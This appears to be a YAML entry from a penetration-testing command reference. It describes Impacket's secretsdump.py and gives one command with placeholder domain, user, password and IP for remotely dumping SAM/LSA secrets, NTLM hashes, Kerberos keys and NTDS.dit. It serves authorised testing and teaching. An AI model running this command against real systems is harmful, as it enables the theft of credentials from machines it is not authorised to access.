---
description: |
  Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.  

  Command Reference:

  	Target IP: 10.10.10.1
  
  	Domain: test.local

  	Username: john

  	Password: password123

items:
  Password:
    - code: |
        python3 secretsdump.py test.local/john:password123@10.10.10.1
  Username:
    - code: |
        empty
filters:
  Kerberos:
    - code: |
        empty
---
